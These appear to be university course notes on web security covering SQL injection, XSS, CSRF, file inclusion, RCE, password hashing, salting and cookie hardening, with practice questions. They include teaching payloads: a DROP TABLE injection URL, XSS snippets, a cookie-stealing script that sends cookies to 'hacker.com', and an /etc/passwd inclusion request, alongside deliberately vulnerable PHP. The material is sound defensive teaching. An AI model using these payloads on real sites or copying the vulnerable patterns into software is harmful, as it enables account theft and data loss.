Web Security: How Sites Get Hacked and How We Defend Them

A tour of the attacks that break real websites — SQL injection, cross-site scripting, CSRF, file inclusion, remote code execution and DDoS — and the defensive techniques that stop them: input sanitisation, output escaping, CSRF tokens, password hashing, salting and safe authentication cookies.

Read this first: Every web vulnerability in this week follows one pattern — a program trusts data it should not trust. If you can spot the exact place where untrusted input (a URL parameter, a form field, a cookie) flows into something powerful (a database query, the browser's HTML parser, the filesystem, eval()), you can predict the attack and the fix. Keep that single idea in mind: never trust input; validate, escape, and authenticate.
~26 min read14 teaching sections14 practice questions24 key terms

By the end you will be able to

  • Explain why web applications get hacked and describe the two broad classes of attack (server-side vs user-side).
  • Recognise and exploit the mechanics of SQL injection, XSS, CSRF, LFI/RFI and RCE on a vulnerable example.
  • Apply the correct defences — input sanitisation, HTML escaping, CSRF tokens and parameterised queries/ORMs.
  • Describe how authentication works across its two stages: logging in and identifying a logged-in session.
  • Explain why passwords are stored as hashes and what makes a good hash function (one-way, unpredictable, non-collision).
  • Describe dictionary and rainbow-table attacks and explain how salting defeats precomputation.
  • Compare stateful and stateless (calculated) authentication tokens and their time/memory trade-offs.
  • Harden cookies using HTTPS, the secure attribute and the HttpOnly attribute.
  • Recall real-world case studies where empty passwords or missing password checks led to full compromise.

How Systems Get Hacked

Websites are not broken by exotic magic — they are broken by predictable design mistakes, and knowing the mistakes is the first defence.

Most breaches trace back to a small set of design failures. System designers:

  • Protect the wrong things.
  • Protect the right things in the wrong way.
  • Make poor assumptions about their systems.
  • Fail to understand the threat model (who the attacker is and what they want).
  • Fail to account for paradigm shifts — for example, moving a system onto the Internet exposes it to a whole new population of attackers.
  • Fail to understand the scope of their system (where it starts and ends, and what it depends on).
💡
Why it matters: You cannot defend a system until you can name the threat model. "Make it secure" is meaningless without asking secure against whom, doing what, and at what cost?

As Michal Zalewski puts it in The Tangled Web, modern web applications are built on "a tangle of technologies that have been developed over time and then haphazardly pieced together." Every layer — from HTTP requests to browser-side scripts — carries important but subtle security consequences, and developers must navigate that landscape confidently to keep users safe.

What does "getting hacked" actually mean?

There are two broad targets, and they lead to two families of attacks.

TargetHow the attack worksExample attacks
ServersManipulate the server-side code running the siteSQL Injection, Remote Code Execution, Local/Remote File Inclusion
UsersAlter or intercept data on a user's computer while they use the site as intendedCross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF)
🧠
Memory hook: Server-side attacks change the code; user-side attacks change the data the user's browser trusts.
🤔

What Can Be Hacked, and the Axioms of Security

Almost everything in a system is attackable — product, infrastructure, application, and above all the people — so security is a resource-allocation problem, not a solvable one.

The attack surface of an organisation extends far beyond its web server. Each of the following is a potential target:

  • A product or component — e.g. a software program, a cryptographic protocol, a smart card.
  • Infrastructure — e.g. a PC, an operating system, communications.
  • Applications — e.g. a web server, a payroll system.
  • IT staff.
  • Users and management.
  • Customers and external users.
  • Partners and vendors.

Axioms of Information Security

These are the foundational truths that shape every security decision:

  1. Information security is a resource game — you never have infinite budget.
  2. All systems are buggy.
  3. The bigger the system, the buggier it is.
  4. Nothing works in isolation — every dependency is an attack path.
  5. Humans are most often the weakest link in a system.
  6. It's a lot easier to break a system than to make it secure.
💡
Why it matters: Because security is a resource game played against an adversary who only needs one hole, perfect security is impossible. The goal is to make the cost of attack exceed its value while protecting the things that matter most.

Focusing on the Important Risks

Not all risks deserve equal attention — you rank them so scarce security effort goes where the damage would be worst.

Risks are graded on a seven-level severity scale, each level carrying a different management response:

LevelWhat it meansWho manages it
1. SevereMust be managed by senior management with a detailed planSenior management
2. HighDetailed research and management requiredSenior levels
3. MajorSenior management attention neededSenior management
4. SignificantManagement responsibility must be specifiedNamed manager
5. ModerateManaged by specific monitoring or response proceduresProcedures
6. LowManaged by routine proceduresRoutine
7. TrivialUnlikely to need specific application of resourcesNone specific

To place a risk on this scale you weigh three competing factors:

  • The likelihood of the component being exploited.
  • The damage if it is exploited.
  • The mitigation cost to prevent exploitation.
✅
Exam tip: A "Severe" risk is not simply the most likely — it is the combination of high likelihood, high damage, and a management response proportionate to a detailed plan. Be ready to justify a ranking using all three factors.

Security Resources and the Rules of Engagement

Learn from the community's shared databases and labs — but only ever test systems you have explicit permission to test.

Where the knowledge lives

  • OWASP — the Open Web Application Security Project. It aims to provide comprehensive assessment and education about web vulnerabilities (its "Top 10" is the canonical list).
  • CVE — the Common Vulnerabilities and Exposures system, a catalogue of publicly known breaches and data leaks. It tracks over 160,000 incidents.
  • DVWA — Damn Vulnerable Web Application, a deliberately simple web app that demonstrates basic web vulnerabilities for practice.
  • PentesterLab — practical tutorials and exercises to learn hacking and penetration-testing skills, including exploitation of web vulnerabilities.

Related study at Sydney: ELEC5616 Computer & Network Security (Semester 1).

Ask for permission — always

  • The only context in which these techniques are legal is when they have been explicitly permitted by the owners and administrators of the networks or applications you are testing.
  • A sound knowledge of these tools opens doors to commercial opportunities and a rewarding career — don't throw it away doing something stupid.

Cloud-specific warning

Cloud providers can prohibit certain security tools, especially those that scan network port ranges or send malicious/malformed traffic. This restriction can usually be waived by submitting a request to scan ahead of time.

⚠️
Common trap: "It's just a test" is not a legal defence. Unauthorised scanning or exploitation — even on a cloud VM you rent — can breach provider terms and the law. Get written permission first.

SQL Injection (SQLi)

SQL injection happens when user input is pasted straight into a database query, letting an attacker rewrite the query itself.

SQL Injection arises from failing to properly sanitise user input before inserting it into a database string. The key insight: if input can modify an SQL query, then it is possible to modify that query to do any database query. It is very common, can lead to complete compromise, and has many automated tools both to detect it and to exploit it automatically.

The vulnerable code

// Get input
$id = $_REQUEST['id'];
// Check database
$query = "SELECT first_name, last_name FROM users
WHERE user_id = '$id';";
$result = mysql_query($query)
// Get results
$row = mysqli_fetch_assoc($result);
// Get values
$first = $row["first_name"];
$last  = $row["last_name"];
// Feedback for end user
$html .= "<p>First name: {$first} Surname: {$last}</p>";

The $id value is concatenated directly between two quotes inside the query string, so anything the attacker supplies becomes part of the SQL.

Normal use vs attack

A benign request returns the expected user:

http://example.com/?id=15

The injected request below uses URL encoding (%27 = ', %3B = ;, + = space):

http://example.com/?id=%27%3B+DROP+TABLE+users%3B+--

The database now executes two statements — the original SELECT, then a destructive one, with the trailing -- commenting out the rest:

SELECT first_name, last_name FROM users WHERE user_id = '';
DROP TABLE users; --';

Defence

  • Using an ORM or a database library (with parameterised queries) defends against this, because the input is treated as data, never as query structure.

The automated tool: sqlmap

Performing an SQL injection has now been automated. sqlmap is a fully open-source (Python) program that automates most of the hard work of SQLi.

⚠️
Common trap: "Sanitising" by escaping quotes by hand is fragile. The robust fix is to separate code from data with parameterised queries or an ORM — never string-concatenate input into a query.

Cross-Site Scripting (XSS)

XSS happens when an attacker injects HTML (and therefore JavaScript) into a page, so the victim's own browser executes the attacker's code.

Cross-Site Scripting arises when an attacker is able to inject HTML into the website. This matters because HTML tells the browser how to display a webpage and can incorporate JavaScript — so injected HTML can carry executable code.

The vulnerable template

Suppose the page inserts the user's name into a heading:

<H1>Hello {% user.name %}</H1>

This works for normal users. But imagine a user whose name is:

<script>alert("LOL");</script>

The page then renders:

<H1>Hello <script>alert("LOL");</script></H1>

and an alert fires when that user loads the page. On its own this is minor, but if the snippet runs on a public page (a user list, or a blog post showing an author's name) and is more malicious than a simple alert, the effects can be devastating.

Why JavaScript in your browser is dangerous: cookie theft

What's the problem with a hacker executing JavaScript in your browser? They can steal your cookies. Consider this injected script:

document.write('<img src="http://hacker.com/collect.php?cookie='
  + document.cookie + '" />')

Every user who loads the page silently sends their cookie to the attacker's server. With a victim's cookie the attacker can authenticate as that user.

💡
Why it matters: The session cookie is the logged-in identity. Stealing it is equivalent to stealing the account — no password needed.
🤔
Pause & predict: A site reflects your search term back into the page inside a <div>. Is this vulnerable to XSS, and what single change to the output step would fix it?

Preventing XSS

You cannot reliably blacklist bad HTML — the correct defence is to HTML-escape all output so it is displayed, never interpreted.

Why stripping <script> tags is wrong

A tempting fix is to strip all <script> tags from user input. This is wrong, for a subtle reason. Consider the input:

<s<script>cript>…</script>

If you strip the inner <script>…</script>, the surrounding text closes back up into:

<script>…</script>

— a working script tag you just created. There are many, many ways to perform XSS and it is impossible to recognise them all. Tags other than <script> work too:

<img src="img.jpg" onerror="alert(1)" />

No <script> appears, yet JavaScript still runs via the onerror handler.

The correct defence: HTML escaping via the templating library

  1. User input is stored in the database as-is, even if it includes HTML tags.
  2. Upon displaying any data, it is HTML escaped by default.

For the earlier malicious name <script>alert("LOL");</script>, HTML escaping produces:

<H1>Hello &lt;script&gt;alert(&quot;LOL&quot;);&lt;/script&gt;</H1>

This prints the HTML to the screen as visible text — it is not interpreted as HTML and not rendered by the browser.

🧠
Memory hook: Escape on output, not input. Store the raw data; escape the moment you render it. Blacklists lose; escaping wins.

Cross-Site Request Forgery (CSRF)

CSRF exploits a site that authenticates the browser (via a cookie) but never authenticates the user's actual request.

Cross-Site Request Forgery (CSRF) is a type of exploit against a website. It arises when only the browser is authenticated (e.g. via a cookie), but the user's request is not properly authenticated. The browser automatically attaches the victim's cookie to any request to the site — including requests the victim never intended to make.

Preventing CSRF

The standard defence is a CSRF token included when making requests that change data:

  • Use the token on requests that change data (e.g. POST, but not GET).
  • When submitting, the website uses JavaScript to also submit a special token from a cookie as one of the POST request variables — a token only the legitimate site has access to.
  • This CSRF token typically appears somewhere in the HTML or in the cookies.
  • Checking for the presence of a CSRF token in the cookie is not enough — it must be included as a variable to authenticate the request.
⚠️
Common trap: A common mistake is verifying that a token exists in the cookie but not that the submitted request variable matches it. The token must be validated as part of the request, not merely observed.
🤔
Pause & predict: Why does the GET/POST distinction matter for CSRF? Think about which request types are supposed to change server state.

Authentication and Password Storage

Authentication has two stages — proving who you are by logging in, then proving you are still that person on every later request.

The two stages of authentication

  1. Logging in — e.g. with a username and password.
  2. Identifying the logged-in session — e.g. with cookies.

The login flow

  1. The user sees a login form and provides a username and password.
  2. The server hashes the password and compares the computed hash with its stored password hash for that user.
  3. If the hashes match, the user is authenticated and the server responds with an authentication cookie/token.

Why we store hashes, not passwords

If passwords were stored as regular plaintext, an attacker who gained access to the database could authenticate as anyone. Instead we store password hashes, so that if the database is breached, the attacker cannot use the information as-is. To use the hashes, the attacker would need to reverse the hash to recover the original passwords — which is meant to be infeasible.

Hash functions: what makes a good one

A hash function maps an input string to an output hash. Desirable properties:

PropertyMeaning
One-wayGiven a hash, the original string cannot be computed.
UnpredictableYou cannot choose an input string to get a particular output hash.
Non-collisionYou cannot find two input strings that map to the same output hash.
💡
Why it matters: Hashing converts "database leak = every account compromised" into "database leak = attacker must still crack each password." The strength of that guarantee depends entirely on the three properties above.

Cracking Passwords and Salting

Hashes don't stop attackers — they just force them to guess; salting makes those guesses far more expensive by defeating precomputation.

Cracking passwords

If an attacker wants to reverse hashes obtained from a database, they could theoretically compute the hash of every possible password and match it against their hash list. This works because passwords are hard to make up and remember, so most human-generated passwords appear in a dictionary — either as a single word or a concatenation of words.

A major extension is the rainbow table: a list of commonly used passwords (e.g. password1, ilikecats123) used to supplement dictionary attacks with additional words. These attacks won't work on every user (a unique gibberish password survives), but they have been shown to work on large portions of leaked password hash sets.

Salting passwords

To mitigate dictionary attacks without forcing stricter password rules on users, passwords can be salted. Before being fed into the hash function, the raw password is concatenated with another string, the salt.

  • Salts are usually stored in plaintext in the database, right next to the password hashes.
  • For further security, a different salt per user can be used.
  • Salting thwarts dictionary attacks that rely on massive precomputation (rainbow tables), because the attacker must redo the work for every salt.
  • However: once the salt is known, brute-force dictionary attacks may still be run.
🧠
Memory hook: Salt makes precomputation useless, not cracking impossible. A leaked salt plus a weak password is still crackable — salting raises the cost, it does not remove the risk.
🤔
Pause & predict: Two users both choose the password ilikecats123. Without salting their stored hashes are identical. What does that reveal to an attacker, and how does per-user salting change it?

Authentication Tokens and Cookie Hygiene

After login you carry a token in your cookie; the server can remember tokens statefully or recompute them statelessly, and either way the cookie itself must be locked down.

Two ways to manage the auth token

After a user provides their password and is authenticated, they receive an auth token, delivered in the cookies. There are two main strategies:

StrategyHow it worksExample
StatefulStore valid tokens & expiry in a databaseRedis
StatelessCalculate valid tokens from a hash of details plus a secretCalculated tokens

Storing valid tokens in a database is obvious; calculated tokens are less so.

Calculated (stateless) authentication tokens

Calculated tokens let the server check whether a user is authenticated without storing tokens. It computes a value that can be re-computed after every request, then checks whether the provided token matches the calculated one. This adds computational overhead (the token is recomputed on every request) but reduces memory overhead.

def build_auth_token(self):
    max_validity_duration_seconds = 21600  # 6 hours
    timestamp = int(
        datetime.datetime.utcnow().strftime("%s")
    )
    validity_timestamp = int(
        timestamp - (timestamp % max_validity_duration_seconds)
    )
    auth_token = hashlib.sha512(
        self.secret_key[0] +
        str(validity_timestamp) +
        str(self.id) +
        self.secret_key[1]
    )
    return auth_token.hexdigest()

def validate_auth_token(self, token):
    return self.build_auth_token() == token;

Notice how the token combines a secret key, a time bucket (the timestamp rounded down to a 6-hour window), and the user id. Because the timestamp is rounded, the same token stays valid within the window; when the window rolls over, the recomputed token changes.

Cookie storage and transport tips

  • Always access the website over HTTPS — this prevents network MITM (man-in-the-middle) attacks from sniffing auth cookies.
  • Set the cookie's secure attribute — the cookie is only sent when connecting via HTTPS.
  • Set the cookie's HttpOnly attribute — scripts on the page cannot read the cookie (e.g. via XSS), and cookies are only sent with HTTP(S) requests.
💡
Why it matters: HttpOnly directly neutralises the XSS cookie-theft attack from earlier: even if an attacker injects JavaScript, document.cookie cannot see the auth cookie.
🤔
Pause & predict: An attacker steals a calculated auth token. It was valid for the current 6-hour window. What happens when the window rolls over, and why can't the attacker simply keep using the old token forever?

LFI/RFI, RCE and DDoS

Three further server-side attacks escalate from reading a file, to running arbitrary code, to simply drowning the service in traffic.

Local/Remote File Inclusion (LFI/RFI)

File inclusion (file:///) is a vulnerability where the web application is manipulated into loading an unexpected file. It can be used to obtain a file's contents or to dynamically change the program's behaviour. The classic vulnerable pattern:

$page = $_GET["page"];
include($page);

Simply visiting:

http://example.com/index.php?page=/etc/passwd

will output the /etc/passwd file if the app is not configured correctly. Simple and obvious as it looks, this is a very common bug.

  • Local file inclusion = files already on the server (as above).
  • Remote file inclusion = get the server to load a file from a remote location.
  • Defence: don't allow user parameters to govern what files can be included.

Remote Code Execution (RCE)

Remote/Arbitrary Code Execution is a vulnerability where an attacker can provide code that runs on the remote server. It is considered the worst type of exploit, because it quickly leads to full server compromise. The most common culprits:

  • The eval() function (or equivalent).
  • PHP unserialize().
  • Regular Expressions with the e flag.

Example from the OWASP Code Injection page:

$myvar = "varname";
$x = $_GET['arg'];
eval("\$myvar = \$x;");

Here the attacker's arg is executed as PHP by eval().

Distributed Denial of Service (DDoS)

Denial of Service attacks prevent anyone from accessing a particular website. Typically this is done by flooding the website with a very large amount of traffic so legitimate user requests cannot be processed.

  • Defence is very difficult — detection mechanisms can introduce a large amount of overhead for legitimate requests.
  • The only real way to defend your system is to "absorb" the attack traffic.
⚠️
Common trap: Don't confuse LFI (read a file) with RCE (run code). LFI is a stepping stone; RCE is the full compromise. eval() is the shortest path from input to RCE.

Case Studies: Authentication Failures in the Wild

Real products shipped with astonishingly basic authentication flaws — these cases show why the fundamentals matter more than clever defences.

Empty password accepted

How many websites/services/operating systems have allowed login when an empty password is submitted for a user?

  • Apple/macOS High Sierra (2017) — a bug let you log in as admin with no password required.
  • Valve/Steam (2015).
  • Linux-PAM < 1.5.1 — CVE-2020-27780.

Default account with empty password

How many have shipped default accounts with empty passwords, allowing anyone to log in?

  • Western Digital My Cloud (2019) — CVE-2019-9950.
  • Microsoft SQL Server (2000) — CVE-2000-1209.
  • D-Link (2020) — CVE-2020-8864.

No password check at all

How many have allowed login without checking the password at all?

  • IRC5 (2020) — CVE-2020-10288.
  • Eclipse Mosquitto (2018) — CVE-2018-12551.
  • Keycloak (2019) — CVE-2019-14909.

Other notable cases

  • Dropbox — a security bug made passwords optional for four hours.
  • vBulletin — CVE-2015-7808, exploited in Metasploit.
  • The MySpace Sammy Worm.
  • GitHub DDoS.
  • The Annoying Site.
ℹ️
Note: Notice the pattern across all these cases — every one is a failure of a basic control (verify the password, don't ship empty defaults, actually check credentials). Sophisticated cryptography is worthless if the front door is unlocked.
🤔

Key Takeaways

If you remember nothing else, remember this.

1

Systems get hacked because designers protect the wrong things, protect the right things wrongly, make poor assumptions, misjudge the threat model, ignore paradigm shifts, and misunderstand scope.

2

Server-side attacks (SQLi, RCE, LFI/RFI) manipulate server code; user-side attacks (XSS, CSRF) manipulate data the user's browser trusts.

3

Security is a resource game: all systems are buggy, bigger systems are buggier, nothing works in isolation, and humans are usually the weakest link.

4

Rank risks on a 7-level severity scale by balancing likelihood of exploitation, damage if exploited, and mitigation cost.

5

Learn from OWASP, CVE (160,000+ tracked incidents), DVWA and PentesterLab — but only test systems you have explicit permission to test; cloud scanning may require a pre-approved request.

6

SQL injection arises from failing to sanitise input inserted into a database string; an ORM or parameterised query library defends against it, and sqlmap automates exploitation.

7

XSS arises from injecting HTML/JavaScript into a page; the fix is HTML escaping on output, never blacklisting <script> tags (nested tags and onerror handlers bypass filters).

8

CSRF exploits a browser-only authentication: the browser sends the cookie automatically, so the request must also carry a validated CSRF token as a variable on state-changing (POST) requests.

9

Authentication has two stages — logging in, then identifying the session; passwords are stored as hashes (one-way, unpredictable, non-collision) so a database breach is not immediately fatal.

10

Dictionary and rainbow-table attacks target weak human passwords; salting (ideally per-user) defeats precomputation, though a known salt still permits brute force.

11

Auth tokens can be stateful (stored in a DB like Redis) or stateless (recomputed from a secret, timestamp and user id); stateless trades CPU for memory.

12

Cookies must be sent over HTTPS and marked secure and HttpOnly to resist MITM sniffing and XSS-based cookie theft.

13

LFI/RFI loads unexpected files, RCE runs attacker code (the worst outcome, via eval(), unserialize() or regex e flag), and DDoS floods traffic — the only real DDoS defence is absorbing the attack.

14

Real breaches (macOS High Sierra, Steam, WD My Cloud, MS SQL Server, Keycloak) show that basic authentication checks are the controls that matter most.

Glossary

Every term you need to speak this week's language.

Threat model
A description of who might attack a system, what they want, and how — the basis for deciding what to protect.
Axioms of information security
Six foundational truths, e.g. all systems are buggy and humans are the weakest link, that frame every security decision.
OWASP
The Open Web Application Security Project; maintains the Top 10 list of the most widespread web vulnerabilities.
CVE
Common Vulnerabilities and Exposures; a public catalogue of known breaches and data leaks, tracking over 160,000 incidents.
DVWA
Damn Vulnerable Web Application; a deliberately insecure app for practising basic web exploits.
SQL Injection (SQLi)
A vulnerability where unsanitised user input alters a database query, potentially allowing any query including data destruction.
sqlmap
An open-source Python tool that automates detecting and exploiting SQL injection.
ORM
Object-Relational Mapper; a database library that uses parameterised queries and so defends against SQL injection.
Cross-Site Scripting (XSS)
A vulnerability where an attacker injects HTML/JavaScript into a page, executing code in victims' browsers.
HTML escaping
Converting characters like <, > and " into entities (&lt;, &gt;, &quot;) so output displays as text rather than rendering.
Cross-Site Request Forgery (CSRF)
An exploit that abuses automatic cookie authentication to make a victim's browser send an unintended, state-changing request.
CSRF token
A secret value embedded in the page/cookie and submitted as a request variable to prove a state-changing request is legitimate.
Hash function
A function mapping an input string to a fixed output hash; good ones are one-way, unpredictable and collision-resistant.
Non-collision
The property that two different input strings cannot feasibly map to the same output hash.
Rainbow table
A precomputed list of hashes of common passwords used to speed up dictionary attacks.
Salt
A random string concatenated with a password before hashing; stored in plaintext beside the hash and, ideally, unique per user.
Auth token
The credential issued after login and carried in a cookie to identify an authenticated session.
Stateful token
An auth token whose validity and expiry are stored server-side in a database (e.g. Redis).
Stateless (calculated) token
An auth token recomputed on each request from a secret, a time bucket and the user id, avoiding token storage.
secure attribute
A cookie flag ensuring the cookie is only sent over HTTPS.
HttpOnly attribute
A cookie flag preventing page scripts (and thus XSS) from reading the cookie.
LFI/RFI
Local/Remote File Inclusion; manipulating an app into loading an unexpected local or remote file, e.g. /etc/passwd.
Remote Code Execution (RCE)
The worst class of exploit, where an attacker runs arbitrary code on the server, quickly leading to full compromise.
DDoS
Distributed Denial of Service; flooding a site with traffic so legitimate requests cannot be served.

No terms in this category.

Practice Questions

Look away from the page first — retrieval is what builds memory.

Answer, reveal, then tick “Mastered”. Your progress is saved.
Q1

Name four reasons system designers allow their systems to be hacked, and state the three factors that decide where to focus security effort.

Answer: Any four of: they protect the wrong things; they protect the right things in the wrong way; they make poor assumptions about their systems; they fail to understand the threat model; they fail to account for paradigm shifts (e.g. the Internet); they fail to understand the scope of their system. Effort is prioritised by balancing the likelihood of exploitation, the damage if exploited, and the mitigation cost to prevent exploitation.
Q2

Distinguish server-side from user-side web attacks and give two examples of each.

Answer: Server-side attacks compromise the servers by manipulating server-side code — examples are SQL Injection, Remote Code Execution, and Local/Remote File Inclusion. User-side attacks alter or intercept data on a user's computer while they use the site as intended — examples are Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF).
Q3

Explain, with the lecture's example, why stripping <script> tags from user input fails to prevent XSS.

Answer: Because stripping can itself create a working tag: the input <s<script>cript>…</script> has its inner <script>…</script> removed, leaving <script>…</script>, which executes. Moreover many XSS vectors don't use <script> at all — e.g. <img src="img.jpg" onerror="alert(1)" />. There are too many variants to blacklist.
Q4

State the correct two-step approach to preventing XSS.

Answer: (1) Store user input in the database as-is, even if it contains HTML tags. (2) HTML-escape all data by default when displaying it, so it is printed as text and never interpreted as HTML by the browser.
Q5

Given a user whose name is <script>alert("LOL");</script> in a heading template, show the HTML-escaped output and explain the result.

Answer: The output is <H1>Hello &lt;script&gt;alert(&quot;LOL&quot;);&lt;/script&gt;</H1>. The <, > and " characters become entities, so the browser prints the literal text to the screen rather than rendering it as HTML or executing the script.
Q6

Why does stealing a user's cookie let an attacker act as that user, which cookie attribute blocks the XSS route to this, and how should auth cookies be stored and sent?

Answer: The auth token/session cookie is the proof of a logged-in session, so possessing it lets the attacker authenticate as the victim without a password. Setting the cookie's HttpOnly attribute prevents page scripts (and therefore injected XSS JavaScript) from reading it via document.cookie. Cookies should also always be sent over HTTPS (preventing MITM sniffing) and carry the secure attribute so they are only sent over HTTPS.
Q7

What is CSRF, on which request types should a CSRF token be used, and how does it prevent the attack?

Answer: CSRF is an exploit that works when only the browser is authenticated (via a cookie) but the user's request is not, letting an attacker cause an unintended state-changing request. Tokens are used on requests that change data — typically POST but not GET. A CSRF token is a secret value placed in the HTML/cookies and submitted as a POST request variable; the server validates that the submitted token matches, authenticating the request itself. Checking merely that a token is present in the cookie is not enough.
Q8

Describe the three steps of a typical login and explain why passwords are stored as hashes.

Answer: (1) The user submits username and password. (2) The server hashes the password and compares it with the stored hash for that user. (3) If they match, the server returns an authentication cookie/token. Passwords are stored as hashes so that if the database is breached the attacker cannot use the values as-is and must first reverse the hash — and good hashes are one-way.
Q9

List the three desirable properties of a hash function and define each.

Answer: One-way — given a hash, the original string cannot be computed. Unpredictable — you cannot choose an input string to obtain a particular output hash. Non-collision — you cannot find two input strings that map to the same output hash.
Q10

Explain how a rainbow table attack works and how salting defends against it.

Answer: A rainbow table is a precomputed list of hashes of common passwords used to reverse stolen hashes quickly. Salting concatenates a random string (ideally unique per user) to the password before hashing, so identical passwords produce different hashes; the attacker cannot reuse precomputed tables and must redo the work for each salt. Once a salt is known, brute-force dictionary attacks may still be attempted.
Q11

Compare stateful and stateless authentication tokens, including their trade-offs, and explain the roles of the secret key, rounded timestamp and user id in the calculated-token code.

Answer: Stateful tokens store valid tokens and their expiry in a database (e.g. Redis); stateless (calculated) tokens are recomputed each request from a secret, a time bucket and the user id and validated by comparison. Stateless avoids token storage (lower memory) but adds computational overhead because the token is recomputed on every request. In the code, the secret key (two parts, prepended and appended) makes the token unforgeable; the timestamp rounded down to a 6-hour window (timestamp - timestamp % 21600) creates a time-bucketed validity so the token changes when the window rolls over; the user id binds the token to a specific user. They are hashed with SHA-512 and returned as a hex digest.
Q12

What are LFI/RFI and RCE, give a vulnerable snippet for each, and state the relevant defences or culprits?

Answer: Local/Remote File Inclusion is manipulating an app into loading an unexpected file, e.g. $page = $_GET["page"]; include($page);. Visiting http://example.com/index.php?page=/etc/passwd outputs /etc/passwd if misconfigured. Local means files already on the server; remote means loading from a remote location. Defence: never let user parameters govern which files are included. Remote Code Execution is where an attacker supplies code that runs on the remote server; it is the worst exploit because it quickly leads to full server compromise, with common culprits being eval() (or equivalent), PHP unserialize(), and regular expressions with the e flag.
Q13

Why is DDoS defence so difficult, and what is the only real defence?

Answer: Because detection mechanisms introduce a large amount of overhead for legitimate requests, so distinguishing attack traffic from real users is costly. The only real way to defend is to "absorb" the attack traffic.
Q14

Give an example of a real-world case where an empty or missing password check caused a compromise.

Answer: Examples include Apple/macOS High Sierra (2017), where an admin could log in with no password; Valve/Steam (2015); Linux-PAM < 1.5.1 (CVE-2020-27780) for empty passwords; Western Digital My Cloud (CVE-2019-9950), Microsoft SQL Server (CVE-2000-1209) and D-Link (CVE-2020-8864) for default accounts with empty passwords; and IRC5 (CVE-2020-10288), Eclipse Mosquitto (CVE-2018-12551) and Keycloak (CVE-2019-14909) for not checking passwords at all.
